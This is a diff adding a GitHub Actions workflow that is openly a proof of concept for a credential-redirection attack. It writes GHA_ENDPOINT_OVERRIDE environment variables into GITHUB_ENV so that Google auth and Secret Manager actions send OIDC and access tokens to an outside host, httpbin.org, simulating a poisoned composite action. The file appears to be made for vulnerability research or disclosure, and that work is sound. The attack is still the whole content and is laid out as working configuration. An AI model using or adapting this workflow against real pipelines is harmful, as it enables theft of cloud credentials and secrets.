@@ -1,0 +1,76 @@
+name: PoC GHA_ENDPOINT_OVERRIDE Multi-Sink
+
+on:
+  push:
+    branches: [main]
+  workflow_dispatch:
+
+jobs:
+  poc-multi-sink:
+    runs-on: ubuntu-latest
+    permissions:
+      id-token: write
+      contents: read
+    steps:
+      - uses: actions/checkout@v4
+
+      # Simulates malicious composite action poisoning GITHUB_ENV with all override vars
+      - name: Poison all override env vars (simulate supply-chain attack)
+        run: |
+          echo "GHA_ENDPOINT_OVERRIDE_sts=https://httpbin.org/post/x" >> $GITHUB_ENV
+          echo "GHA_ENDPOINT_OVERRIDE_iam=https://httpbin.org/post/x" >> $GITHUB_ENV
+          echo "GHA_ENDPOINT_OVERRIDE_iamcredentials=https://httpbin.org/post/x" >> $GITHUB_ENV
+          echo "[!] Override env vars set"
+
+      - name: Auth - WIF flow (redirect STS to httpbin)
+        id: auth
+        uses: google-github-actions/auth@v2
+        continue-on-error: true
+        with:
+          workload_identity_provider: 'projects/12345/locations/global/workloadIdentityPools/poc-pool/providers/poc-provider'
+          service_account: 'poc@poc-project.iam.gserviceaccount.com'
+
+      - name: Capture evidence - STS override
+        if: always()
+        run: |
+          echo "=== Auth outcome: ${{ steps.auth.outcome }} ==="
+          echo "If \"Failed to call https://httpbin.org/post/x/token\" appears above, the OIDC token was sent to httpbin."
+
+  # Separate job for Secret Manager override with real token
+  poc-secretmanager:
+    runs-on: ubuntu-latest
+    permissions:
+      id-token: write
+      contents: read
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Poison secretmanager override
+        run: |
+          echo "GHA_ENDPOINT_OVERRIDE_secretmanager=https://httpbin.org/get/x" >> $GITHUB_ENV
+          echo "[!] Override env var set for secretmanager"
+
+      # We need a valid GCP token. Use the raw OIDC approach:
+      # Auth action writes a credential file; secretmanager action reads it.
+      - name: Auth with real WIF - but allow failure
+        id: real-auth
+        uses: google-github-actions/auth@v2
+        continue-on-error: true
+        with:
+          workload_identity_provider: 'projects/12345/locations/global/workloadIdentityPools/poc-pool/providers/poc-provider'
+          service_account: 'poc@poc-project.iam.gserviceaccount.com'
+          create_credentials_file: true
+
+      - name: Secret Manager - victim step
+        id: secrets
+        uses: google-github-actions/get-secretmanager-secrets@v2
+        continue-on-error: true
+        with:
+          secrets: |-
+            token:poc-project/my-secret
+
+      - name: Capture evidence - Secret Manager override
+        if: always()
+        run: |
+          echo "=== SM outcome: ${{ steps.secrets.outcome }} ==="
+          echo "If \"Failed to access secret\" message contains httpbin.org, the access token/call was redirected."
